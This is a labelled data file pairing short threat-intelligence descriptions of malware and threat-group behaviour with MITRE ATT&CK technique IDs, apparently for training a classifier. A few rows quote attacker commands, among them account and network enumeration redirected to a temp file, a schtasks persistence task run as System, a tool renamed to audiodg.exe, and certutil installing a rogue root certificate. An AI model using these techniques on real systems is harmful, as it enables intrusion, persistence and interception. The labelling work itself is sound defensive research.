text1	labels
accessed email accounts using Outlook Web Access.	['T1114']
accesses network share(s), enables share access to the target device, and copies an executable payload to the target system, and uses a  to execute the malware.	['T1021.002']
accesses the HKLM\System\CurrentControlSet\Services\mssmbios\Data\SMBiosData Registry key to obtain the System manufacturer value to identify the machine type.	['T1012']
achieves persistence by adding a shortcut of itself to the startup path in the Registry.	['T1547.001']
achieves persistence by adding itself to the HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run Registry key.	['T1547.001']
achieves persistence by creating a Registry entry in HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run.	['T1547.001']
achieves persistence by creating a shortcut in the current user's Startup folder.	['T1547.009', 'T1547.001']
achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.	['T1547.009', 'T1547.001']
achieves persistence by making an entry in the Registry's Run key.	['T1547.001']
achieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access.	['T1547.001']
actors have been known to copy files to the network shares of other computers to move laterally.	['T1021.002']
actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.	['T1546.008']
actors have split RAR files for exfiltration into parts.	['T1030']
actors have used  and a modified version of  called Wrapikatz to dump credentials. They have also dumped credentials from domain controllers.	['T1003']
actors have used DLL side-loading. Actors have used legitimate Kaspersky anti-virus variants in which the DLL acts as a stub loader that loads and executes the shell code.	['T1574.002']
actors leverage legitimate credentials to log into external remote services.	['T1078', 'T1133']
actors obtained a list of active processes on the victim and sent them to C2 servers.	['T1057']
actors obtain legitimate credentials using a variety of methods and use them to further lateral movement on victim networks.	['T1078']
actors spawned shells on remote systems on a victim network to execute commands.	['T1059']
actors used compromised credentials for the victim's endpoint management platform, Altiris, to move laterally.	['T1078']
actors used legitimate credentials of banking employees to perform operations that sent them millions of dollars.	['T1078']
actors used the following command following exploitation of a machine with  malware to display network connections: netstat -ano >> %temp%\download	['T1049']
actors used the following command following exploitation of a machine with  malware to obtain information about services: net start >> %temp%\download	['T1007']
"actors used the following commands after exploiting a machine with  malware to obtain information about files and directories: dir c:\ >> %temp%\download dir ""c:\Documents and Settings"" >> %temp%\download dir ""c:\Program Files\"" >> %temp%\download dir d:\ >> %temp%\download"	['T1083']
actors used the following commands following exploitation of a machine with  malware to enumerate user accounts: net user >> %temp%\download net user /domain >> %temp%\download	['T1087']
"actors used the following command to rename one of their tools to a benign file name: ren ""%temp%\upload"" audiodg.exe"	['T1036']
actors used the native  Windows task scheduler tool to use scheduled tasks for execution on a victim network.	['T1053.005']
actors use nbtscan to discover vulnerable systems.	['T1016']
actors use the Hunter tool to conduct network service discovery for vulnerable systems.	['T1046']
actors use  to schedule tasks to run self-extracting RAR archives, which install  or  on other victims on a network.	['T1053.005']
"added ""junk data"" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a ""junk length"" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire."	['T1001']
added junk data to outgoing UDP packets to peer implants.	['T1001']
added newly created accounts to the administrators group to maintain elevated access.	['T1098']
added Registry Run keys to establish persistence.	['T1547.001']
adds a .lnk file to the Windows startup folder.	['T1547.009']
adds a .plist file to the /Library/LaunchAgents folder to maintain persistence.	['T1543.001']
adds an entry to the rc.common file for persistence.	['T1037.004']
adds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service.	['T1036']
adds a new service named NetAdapter to establish persistence.	['T1543.003']
adds a Registry Run key for ctfmon.exe to establish persistence.	['T1547.001']
adds a Registry Run key for persistence and adds a script in the Startup folder to deploy the payload.	['T1547.001']
adds a Registry Run key to establish persistence.	['T1547.001']
adds Registry Run keys to achieve persistence.	['T1547.001']
A Destover-like implant used by  can obtain the current system time and send it to the C2 server.	['T1124']
A Destover-like variant used by  uses a batch file mechanism to delete its binaries from the system.	['T1064']
A dropper used by  installs itself into the ASEP Registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run with a value named McUpdate.	['T1547.001']
Adversaries can instruct  to spread laterally by copying itself to shares it has enumerated and for which it has obtained legitimate credentials (via keylogging or other means). The remote host is then infected by using the compromised credentials to schedule a task on remote machines that executes the malware.	['T1053.005', 'T1021.002', 'T1078']
A  file stealer can communicate over HTTP for C2.	['T1071']
A  file stealer can gather the victim's computer name and drive serial numbers to send to a C2 server.	['T1082']
A  file stealer can gather the victim's username to send to a C2 server.	['T1033']
A  file stealer can run a TaskScheduler DLL to add persistence.	['T1053.005']
A  file stealer has the capability to steal data from newly connected logical volumes on a system, including USB drives.	['T1025']
A  file stealer transfers collected files to a hardcoded C2 server.	['T1041']
After collecting files and logs from the victim,  encrypts some collected data with Blowfish.	['T1486']
After compromising a victim,  lists all running processes.	['T1057']
After copying itself to a DLL file, a variant of  calls the DLL file using rundll32.exe.	['T1218.011']
After decrypting itself in memory,  downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process. This “downloaded” file is actually not dropped onto the system.	['T1055']
After downloading its main config file,  downloads multiple payloads from C2 servers.	['T1105']
After encrypting C2 data,  converts it into a hexadecimal representation and then encodes it into base64.	['T1001']
After encrypting log files, the log encryption module in  deletes the original, unencrypted files from the host.	['T1070']
After initial compromise,  will download a second stage to establish a more permanent presence on the affected system.	['T1104']
After using raw sockets to communicate with its C2 server,  uses a decrypted string to create HTTP POST requests.	['T1071']
aggregates collected data in a tmp file.	['T1074']
A  implant file was named ASPNET_FILTER.DLL, mimicking the legitimate ASP.NET ISAPI filter DLL with the same name.	['T1036']
A  Javascript backdoor added a local_update_check value under the Registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run to establish persistence. Additionally, a  custom executable containing Metasploit shellcode is saved to the Startup folder to gain persistence.	['T1547.001']
A  JavaScript backdoor has used Google Apps Script as its C2 server.	['T1102']
A keylogging tool used by  gathers network information from the victim, including the MAC address, IP address, WINS, DHCP server, and gateway.	['T1016']
A Linux version of  checks if the victim user ID is anything other than zero (normally used for root), and the malware will not execute if it does not have root privileges.  also gathers the username of the victim.	['T1033']
allows actors to spawn a reverse shell on a victim.	['T1059']
allows adversaries to enumerate and modify the infected host's file system. It supports searching for directories, creating directories, listing directory contents, reading and writing to files, retrieving file attributes, and retrieving volume information.	['T1083']
allows adversaries to execute shell commands on the infected host.	['T1059']
"allows adversaries to modify the way the ""beacon"" payload communicates. This is called ""Malleable C2"" in the  manual and is intended to allow a penetration test team to mimic known APT C2 methods."	['T1095']
allows adversaries to search for files.	['T1083']
A  macro deletes files after it has decoded and decompressed them.	['T1070.004']
A  malware sample adds persistence on the system by creating a shortcut in the user’s Startup folder.	['T1547.009']
A  malware sample encodes data with base64.	['T1132']
A  malware sample performs reflective DLL injection.	['T1055']
A  module has a default C2 port of 13000.	['T1571']
A module in  collects information from the victim about installed anti-virus software.	['T1518.001']
A module in  collects information from the victim about its IP addresses and MAC addresses.	['T1016']
A module in  collects information from the victim about the current user name.	['T1033']
A module in  collects information from the victim about Windows OS version, computer name, battery info, and physical memory.	['T1082']
A module in  collects information on available printers and disk drives.	['T1120']
An  backdoor may collect the entire contents of an inserted USB device.	['T1025']
"An  downloader creates persistence by creating the following scheduled task: schtasks /create /tn ""mysc"" /tr C:\Users\Public\test.exe /sc ONLOGON /ru ""System""."	['T1053.005']
An  downloader establishes SOCKS5 connections for its initial C2.	['T1090', 'T1095']
An  downloader first establishes a SOCKS5 connection to 192.157.198[.]103 using TCP port 1913; once the server response is verified, it then requests a connection to 192.184.60[.]229 on TCP port 81.	['T1104']
"An  downloader uses the Windows command ""cmd.exe"" /C whoami. The group also uses a tool to execute commands on remote computers."	['T1059']
"An  downloader uses the Windows command ""cmd.exe"" /C whoami to verify that it is running with the elevated privileges of “System.”"	['T1033']
An executable dropped onto victims by  aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express (msinm.exe), Outlook (outlook.exe), Internet Explorer (iexplore.exe), and Firefox (firefox.exe).	['T1055']
An  HTTP malware variant decrypts strings using single-byte XOR keys.	['T1140']
An  HTTP malware variant establishes persistence by setting the Registry key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\Windows Debug Tools-%LOCALAPPDATA%\.	['T1547.001']
An  HTTP malware variant used Base64 to encode communications to the C2 server.	['T1132']
An  loader Trojan adds the Registry key HKCU\Environment\UserInitMprLogonScript to establish persistence.	['T1037']
An  loader Trojan uses a batch script to run its payload.	['T1064']
An  loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.	['T1057']
An older variant of  performs UAC bypass.	['T1548.002']
An older version of  has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.	['T1083']
An  Port 22 malware variant registers itself as a service.	['T1543.003']
A  payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.	['T1112']
A  payload has searched all fixed drives on the victim for files matching a specified list of extensions.	['T1083']
A  payload uses process hollowing to hide the UAC bypass vulnerability exploitation inside svchost.exe.	['T1055.012']
A  payload was packed with UPX.	['T1027.002']
APIs and strings in some  variants are RC4 encrypted. Another variant is encoded with XOR.	['T1027']
apparently altered  samples by adding four bytes of random letters in a likely attempt to change the file hashes.	['T1027.001', 'T1027.005']
appears to have functionality to modify remote Registry information.	['T1112']
appends a file signature header (randomly selected from six file types) to encrypted data prior to upload or download.	['T1027']
appends a total of 64MB of garbage data to a file to deter any security products in place that may be scanning files on disk.	['T1027.001']
As part of the data reconnaissance phase,  grabs the system time to send back to the control server.	['T1124']
A system info module in  gathers information on the victim host’s configuration.	['T1082']
A  tool can create a new service, naming it after the config information, to gain persistence.	['T1543.003']
A  tool can encrypt payloads using XOR.  malware is also obfuscated using Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.	['T1027']
A  tool can read and decrypt stored Registry values.	['T1012']
A  tool can spawn svchost.exe and inject the payload into that process.	['T1055']
A  tool can use a public UAC bypass method to elevate privileges.	['T1548.002']
A  tool can use WMI to execute a binary.	['T1047']
attempted to contact the C2 server over TCP using port 80.	['T1043']
attempted to get users to click on an embedded macro within a Microsoft Office Excel document to launch their malware.	['T1204']
attempted to get users to click on Microsoft Excel attachments containing malicious macro scripts.	['T1204']
attempted to get users to launch malicious attachments delivered via spearphishing emails.	['T1204']
attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.	['T1204']
attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.	['T1598.003']
attempted to use RDP to move laterally.	['T1021.001']
attempts to access the ADMIN$, C$\Windows, D$\Windows, and E$\Windows shares on the victim with its current privileges.	['T1083']
attempts to add a shortcut file in the Startup folder to achieve persistence.	['T1547.009']
attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails, it attempts to add Registry Run keys.	['T1547.001']
"attempts to avoid detection by checking a first stage command and control server to determine if it should connect to the second stage server, which performs ""louder"" interactions with the malware."	['T1104']
attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.	['T1548.002']
attempts to detect several anti-virus products.	['T1518.001']
attempts to disable UAC remote restrictions by modifying the Registry.	['T1548.002']
attempts to download an encrypted binary from a specified domain.	['T1105']
attempts to escalate privileges by bypassing User Access Control.	['T1548.002']
attempts to exploit privilege escalation vulnerabilities CVE-2010-0232 or CVE-2010-4398.	['T1068']
attempts to hide its payloads using legitimate filenames.	['T1036']
attempts to obtain legitimate credentials during operations.	['T1078']
attempts to overwrite operating system files with image files.	['T1070.004']
A  uses a encrypted and compressed payload that is disguised as a bitmap within the resource section of the installer.	['T1027']
automatically collects files from the local system and removable drives based on a predefined list of file extensions on a regular timeframe.	['T1119']
automatically searches for files on local drives based on a predefined list of file extensions.	['T1083']
automatically searches for files on local drives based on a predefined list of file extensions and sends them to the command and control server every 60 minutes.  also automatically sends keylogger files and screenshots to the C2 server on a regular timeframe.	['T1020']
A  variant can force the compromised system to function as a proxy server.	['T1090']
A  variant downloads the backdoor payload via the BITS service.	['T1197']
A  variant encodes C2 POST data base64.	['T1132']
A  variant has used DLL side-loading.	['T1574.002']
A  variant has used rundll32 for execution.	['T1218.011']
A  variant is encoded using a simple XOR cipher.	['T1027']
A variant of  attempts communication to the C2 server over HTTP on port 443.	['T1043']
A variant of  encrypts some C2 with 3DES and RSA.	['T1573']
A variant of  executes dir C:\progra~1 when initially run.	['T1083']
A  variant uses a C2 mechanism similar to port knocking that allows attackers to connect to a victim without leaving the connection open for more than a few sectonds.	['T1095']
A  variant uses DLL search order hijacking.	['T1574.001']
A  variant uses fake TLS to communicate with the C2 server.	['T1095']
A  VBA Macro sets its file attributes to System and Hidden.	['T1564.001']
A  VBScript receives a batch script to execute a set of commands in a command prompt.	['T1119']
A version of  introduced in July 2015 inserted junk code into the binary in a likely attempt to obfuscate it and bypass security products.	['T1027.001']
A version of  loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application whitelisting techniques.	['T1127']
avoids analysis by encrypting all strings, internal files, configuration data.	['T1027']
A Word document delivering  prompts the user to enable macro execution.	['T1204']
Based on comparison of  versions,  made an effort to obfuscate strings in the malware that could be used as IoCs, including the mutex name and named pipe.	['T1027.005']
beacons to destination port 443.	['T1043']
Before being appended to image files,  commands are encrypted with a key composed of both a hard-coded value and a string contained on that day's tweet. To decrypt the commands, an investigator would need access to the intended malware sample, the day's tweet, and the image file containing the command.	['T1573']
Before writing to disk,  inserts a randomly generated string into the middle of the decrypted payload in an attempt to evade hash-based detections.	['T1027.001']
binds and listens on port 1058.	['T1571']
binds and listens on port 443.	['T1043']
bypassed User Access Control (UAC).	['T1548.002']
bypasses UAC to escalate privileges by using a custom “RedirectEXE” shim database.	['T1548.002']
bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).	['T1548.002']
C2 messages are Base64-encoded.	['T1132']
C2 servers communicated with malware over TCP 8081, 8282, and 8083.	['T1571']
C2 traffic attempts to evade detection by resembling data generated by legitimate messenger applications, such as MSN and Yahoo! messengers.	['T1001']
C2 traffic can communicate via TCP raw sockets.	['T1095']
C2 traffic for most  tools occurs over Port Numbers 53, 80, and 443.	['T1043']
C2 traffic from  is encrypted, then encoded with Base64 encoding.	['T1132']
C2 traffic has been encrypted with RC4 and AES.	['T1573']
C2 traffic is base64-encoded.	['T1132']
C2 traffic is encrypted using bitwise NOT and XOR operations.	['T1573']
calls cmd.exe to run various DLL files via rundll32.	['T1218.011']
calls cmd.exe to run various DLL files via rundll32 and also to perform file cleanup.  also has the capability to invoke a reverse shell.	['T1059']
can accept multiple URLs for C2 servers.	['T1008']
can add a new service to ensure  persists on the system when delivered as another payload onto the system.	['T1543.003']
can add or remove applications or ports on the Windows firewall or disable it entirely.	['T1562.001']
can alter the victim's proxy configuration.	['T1562.001']
can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.	['T1548.002']
can be added as a service to establish persistence.	['T1543.003']
can be configured to have commands relayed over a peer-to-peer network of infected hosts. This can be used to limit the number of egress points, or provide access to a host without direct internet access.	['T1090']
can be configured to use HTTP or DNS for command and control.	['T1071']
can be configured to use multiple network protocols to avoid network-based detection.	['T1026']
can be configured to use raw TCP or UDP for command and control.	['T1095']
can be launched by using DLL search order hijacking in which the wrapper DLL is placed in the same folder as explorer.exe and loaded during startup into the Windows Explorer process instead of the legitimate library.	['T1574.001']
can be used as a persistence proxy technique to execute a helper DLL when netsh.exe is executed.	['T1546.007']
can be used to copy files to a remotely connected system.	['T1105']
can be used to create  to upload and/or download files.	['T1105']
can be used to create  to upload files from a compromised host.	['T1048']
can be used to delete files from the file system.	['T1070.004']
can be used to disable local firewall settings.	['T1562.001']
can be used to discover current NetBIOS sessions.	['T1049']
can be used to discover local NetBIOS domain names.	['T1016']
can be used to discover processes running on a system.	['T1057']
can be used to discover services running on a system.	['T1007']
can be used to discover system firewall settings.	['T1518.001']
can be used to display ARP configuration information on the host.	['T1016']
can be used to download files from a given URL.	['T1105']
can be used to dump credentials.	['T1003']
can be used to enumerate local network connections, including active TCP connections and other network statistics.	['T1049']
can be used to enumerate security software currently running on a system by process name of known products.	['T1518.001']
can be used to execute binaries on remote systems by creating and starting a service.	['T1569.002']
can be used to find files and directories with native functionality such as dir commands.	['T1083']
can be used to find information about the operating system.	['T1082']
can be used to gather information about the operating system.	['T1082']
can be used to identify remote systems within a network.	['T1018']
can be used to install browser root certificates as a precursor to performing man-in-the-middle between connections to banking websites. Example command: certutil -addstore -f -user ROOT ProgramData\cert512121.der.	['T1553.004']
can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension, name, and/or age)	['T1083']
can be used to schedule a task on a system.	['T1053.005']
can be used to set up a proxy tunnel to allow remote host access to an infected host.	['T1090']
can be used to subvert controls and possibly conceal command execution by not directly invoking .	['T1202']
can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths.	['T1548.002']
can capture a screenshot from a victim.	['T1113']
can capture desktop screenshots in the PNG format and send them to the C2 server.	['T1113']
can capture screenshots.	['T1113']
can capture screenshots at a configurable interval.	['T1113']
can capture screenshots of not only the entire screen, but of each separate window open, in case they are overlapping.	['T1113']
can capture screenshots of the victim’s machine.	['T1113']
can capture the victim's screen.	['T1113']
can change Internet Explorer settings to reduce warnings about malware activity.	['T1562.001']
can collect CPU and architecture information from the victim’s machine.	['T1082']
can collect data from a local system.	['T1005']
can collect data from user directories.	['T1005']
can collect operating system (OS) version information, processor information, system name, and information about installed disks from the victim.	['T1082']
can communicate over a reverse proxy using SOCKS5.	['T1090']
can communicate over FTP and send email over SMTP.	['T1071']
can communicate over HTTP, SMTP, and POP3 for C2.	['T1071']
can communicate over HTTP for C2.	['T1071']
can communicate to its C2 over HTTP and HTTPS if directed.	['T1071']
can communicate to its C2 over TCP using a custom binary protocol.	['T1095']
can communicate using SOCKS.	['T1095']
can compress data with Zip before sending it over C2.	['T1560']
can conduct file browsing.	['T1083']
can create a directory (C:\ProgramData\Mail\MailAg\gl) to use as a temporary directory for uploading files.	['T1074']
can create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name.	['T1036']
can create a new service named msamger (Microsoft Security Accounts Manager).	['T1543.003']
can create a remote shell and run a given command.	['T1059']
can create a shortcut in the Windows startup folder for persistence.	['T1547.009', 'T1547.001']
"can create backdoor accounts with the login ""HelpAssistant"" with the Limbo module."	['T1136']
can delete all Registry entries created during its execution.	['T1112']
can delete a specified file.	['T1070.004']
can delete files and directories.	['T1070.004']
can delete files and itself after infection to avoid analysis.	['T1070.004']
can delete files and optionally overwrite with random data beforehand.	['T1070.004']
can delete files off the system.	['T1070.004']
can delete files on the victim’s machine.	['T1070.004']
can delete files written to disk.	['T1070.004']
can delete itself or specified files.	['T1070.004']
can delete malware and associated artifacts from the victim.	['T1070.004']
can delete services from the victim’s machine.	['T1543.003']
can delete specified files.	['T1070.004']
"can deliver ""beacon"" payloads for lateral movement by leveraging remote COM execution."	['T1021.003']
can disable Avira anti-virus.	['T1562.001']
can disable Microsoft Office Protected View by changing Registry keys.	['T1562.001']
can discover and collect victim system information.	['T1082']
can download additional encrypted backdoors onto the victim via GIF files.	['T1105']
can download additional files.	['T1105']
can download additional files and payloads to compromised hosts.	['T1105']
can download additional files from URLs.	['T1105']
can download additional payloads onto the victim.	['T1105']
can download and execute additional files.	['T1105']
can download and execute an arbitary executable.	['T1105']
can download and execute files.	['T1105']
can download and launch additional payloads.	['T1105']
can download and upload files to and from the victim’s machine.	['T1105']
can download and upload files to the victim's machine.	['T1105']
can download an executable to run on the victim.	['T1105']
can download files from its C2 server to the victim's machine.	['T1105']
can download files from remote servers.	['T1105']
can download files from the C2 server to the victim’s machine.	['T1105']
can download files off the target system to send back to the server.	['T1005']
can download files onto the victim.	['T1105']
can download files remotely.	['T1105']
can download or upload files from its C2 server.	['T1105']
can download remote files.	['T1105']
can download remote files and additional payloads to the victim's machine.	['T1105']
can download remote files onto victims.	['T1105']
can drop a mouse-logger that will take small screenshots around at each click and then send back to the server.	['T1113']
can dump credentials.	['T1003']
can dump passwords and save them into \ProgramData\Mail\MailAg\pwds.txt.	['T1003']
can dump the SAM database.	['T1003']
can enable/disable RDP connection and can start a remote desktop session using a browser web socket client.	['T1021.001']
can enable remote desktop on the victim's machine.	['T1021.001']
can encrypt C2 traffic with AES.	['T1573']
can enumerate active windows.	['T1010']
can enumerate and search for files and directories.	['T1083']
can enumerate drives and Remote Desktop sessions.	['T1049']
can enumerate drives and their types. It can also change file permissions using cacls.exe.	['T1083']
can enumerate local information for Linux hosts and find currently logged on users for Windows hosts.	['T1033']
can enumerate processes.	['T1057']
can enumerate Registry keys.	['T1012']
can enumerate Registry values, keys, and data.	['T1012']
"can establish persistence by adding a Scheduled Task named ""Microsoft Boost Kernel Optimization""."	['T1053.005']
can establish persistence by adding Registry Run keys.	['T1547.001']
can establish persistence by creating a .lnk file in the Start menu.	['T1547.001']
can establish persistence by creating a .lnk file in the Start menu or by modifying existing .lnk files to execute the malware through cmd.exe.	['T1547.009']
can establish persistence by creating a scheduled task.	['T1053.005']
can establish persistence by setting the value “Shell” with “explorer.exe, %malware_pathfile%” under the Registry key HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon.	['T1547.004']
can establish persistence through the system screensaver by configuring it to execute the malware.	['T1546.002']
can establish using a AppCertDLLs Registry key.	['T1546.009']
can establish using a Registry run key.	['T1547.001']
can execute a payload on a remote host with PowerShell. This technique does write any data to disk.	['T1059.001']
can execute a task to download a file.	['T1105']
can execute commands from its C2 server.	['T1059']
can execute commands on the victim.	['T1059']
can execute commands on the victim's machine.	['T1059']
can execute commands on victims.	['T1059']
can execute commands remotely by creating a new schedule task on the remote system	['T1053.005']
can execute commands remotely by creating a new service on the remote system.	['T1569.002']
can execute commands using a shell.	['T1059']
can execute commands using cmd.exe.	['T1059']
can execute commands with script as well as execute JavaScript.	['T1064']
can execute ipconfig on the victim’s machine.	['T1016']
can execute PowerShell scripts.	['T1059.001']
can execute shell commands using cmd.exe.	['T1059']
can exfiltrate data via a DNS tunnel or email, separately from its C2 channel.	['T1048']
can exploit vulnerabilities such as MS14-058.	['T1068']
can extract cached password hashes from a system’s registry.	['T1003']
can function as a proxy to create a serve that relays communication between the client and C&C server.	['T1090']
can gather a list of processes.	['T1057']
can gather a process list from the victim.	['T1057']
can gather browser usernames and passwords.	['T1003']
can gather information about TCP connection state.	['T1049']
can gather information about the host.	['T1082']
can gather information on the mapped drives, OS version, computer name, and memory size.	['T1082']
can gather information on the victim username.	['T1033']
can gather network share information.	['T1135']
can gather Registry values.	['T1012']
can gather system information, the computer name, OS version, drive and serial information from the victim's machine.	['T1082']
can gather the disk volume information.	['T1082']
can gather the IP address from the victim's machine.	['T1016']
can gather the victim computer name and serial number.	['T1082']
can gather the victim user name.	['T1033']
can gather victim drive information.	['T1083']
can gather victim proxy information.	['T1016']
can get a list of the processes and running tasks on the system.	['T1057']
can identify logged in users across the domain and views user sessions.	['T1033']
can identify system information, including battery status.	['T1082']
can inject a malicious DLL into a process.	['T1055']
can inject a variety of payloads into processes dynamically chosen by the adversary.	['T1055']
can install a new service.	['T1543.003']
can install encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellCompatibility\Applications\laxhost.dll and HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PrintConfigs.	['T1112']
can install itself as a new service.	['T1543.003']
can interact with a victim’s Outlook session and look through folders and emails.	['T1114']
can launch a remote shell to execute commands.	['T1059']
can launch cmd.exe to execute commands on the system.	['T1059']
can list all files on a system.	['T1083']
can list connected devices.	['T1120']
can list directories on a victim.	['T1083']
can list files and directories.	['T1083']
can list local and remote shared drives and folders over SMB.	['T1135']
can list running services.	['T1007']
can lists information about files in a directory.	['T1083']
can list the running processes and get the process ID and parent process’s ID.	['T1057']
can load a DLL using .	['T1218.011']
can load a DLL using the LoadLibrary API.	['T1129']
can log keystrokes.	['T1056']
can manipulate Registry keys.	['T1112']
can migrate into another process using reflective DLL injection.	['T1055']
can modify file or directory timestamps.	['T1070.006']
can modify service configurations.	['T1543.003']
can obtain a list of active connections and open ports.	['T1049']
can obtain a list of running processes on the victim’s machine.	['T1057']
can obtain a list of SIDs and provide the option for selecting process tokens to impersonate.	['T1134']
can obtain a list of smart card readers attached to the victim.	['T1120']
can obtain a process list from the victim.	['T1057']
can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.	['T1016']
can obtain information about process integrity levels.	['T1057']
can obtain information about running processes on the victim.	['T1057']
can obtain information about security software on the victim.	['T1518.001']
can obtain information about the current user.	['T1033']
can obtain information about the logged on user both locally and for Remote Desktop sessions.	['T1033']
can obtain information about the victim's IP address.	['T1016']
can obtain information on installed anti-malware programs.	['T1518.001']
can obtain network information, including DNS, IP, and proxies.	['T1016']
can obtain passwords from common browsers and FTP clients.	['T1003', 'T1552.001']
can obtain running services on the victim.	['T1007']
can obtain screenshots from the victim.	['T1113']
can obtain the computer name, OS version, and default language identifier.	['T1082']
can obtain the date and time of a system.	['T1124']
can obtain the victim user name.	['T1033', 'T1069']
can open an interactive command-shell to perform command line functions on victim machines.	['T1059']
can open the Windows Firewall on the victim’s machine to allow incoming connections.	['T1562.001']
can overwrite Registry settings to reduce its visibility on the victim.	['T1070']
can perform DLL injection.	['T1055']
can perform DLL loading.	['T1055']
can perform keylogging.	['T1056']
can perform pass the hash.	['T1550.002']
can perform process injection by using a reflective DLL.	['T1055']
can perform screen captures of the victim’s machine.	['T1113']
